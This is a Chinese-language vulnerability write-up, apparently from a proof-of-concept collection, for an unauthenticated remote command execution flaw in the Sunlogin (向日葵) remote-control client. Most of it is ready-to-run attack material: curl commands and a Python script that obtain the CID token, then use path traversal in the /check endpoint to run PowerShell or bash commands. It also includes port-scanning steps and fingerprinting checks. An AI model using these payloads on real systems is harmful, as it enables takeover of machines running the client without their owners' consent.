## 漏洞描述

向日葵远程控制软件在本地开启的 Web 服务存在远程命令执行漏洞。攻击者先通过 `/cgi-bin/rpc?action=verify-haras` 获取 CID 认证令牌，然后利用 `/check` 接口通过路径遍历调用系统 PowerShell 执行任意命令。向日葵运行时会在 40000-65535 端口范围内随机开放一个端口。

## 影响版本

- 向日葵 11.0.0.33162 及附近版本

## 前置条件

- 无需认证
- 向日葵客户端正在运行
- 需要扫描 40000-65535 端口找到服务端口

## 利用步骤

1. 扫描目标 40000-65535 端口范围找到向日葵 Web 服务
2. 请求 `/cgi-bin/rpc?action=verify-haras` 获取 CID
3. 使用 CID 作为 Cookie 请求 `/check` 接口执行命令

## Payload

### 获取 CID

```bash
curl -s "http://target:PORT/cgi-bin/rpc?action=verify-haras"
# 返回 JSON: {"verify_string":"xxxx","code":0}
```

### Windows 命令执行

```bash
curl -s "http://target:PORT/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami" \
  -H "Cookie: CID=VERIFY_STRING_VALUE"
```

### Linux 命令执行

```bash
curl -s "http://target:PORT/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fbin%2Fbash+-c+id" \
  -H "Cookie: CID=VERIFY_STRING_VALUE"
```

### Python 自动化利用

```python
import requests

target = "http://target:PORT"
# 获取 CID
r = requests.get(f"{target}/cgi-bin/rpc?action=verify-haras")
cid = r.json()["verify_string"]

# 执行命令
cmd = "whoami"
r = requests.get(
    f"{target}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{cmd}",
    cookies={"CID": cid}
)
print(r.text)
```

## 验证方法

```bash
# 先获取 CID
CID=$(curl -s "http://target:PORT/cgi-bin/rpc?action=verify-haras" | grep -oP '"verify_string":"[^"]*"' | cut -d'"' -f4)
# 执行 whoami 验证
curl -s "http://target:PORT/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami" \
  -H "Cookie: CID=$CID"
```

## 指纹确认

```bash
# 向日葵特征响应
curl -s "http://target:PORT/cgi-bin/rpc?action=verify-haras" | grep "verify_string"
# 返回 "Verification failure" 也表明是向日葵
```
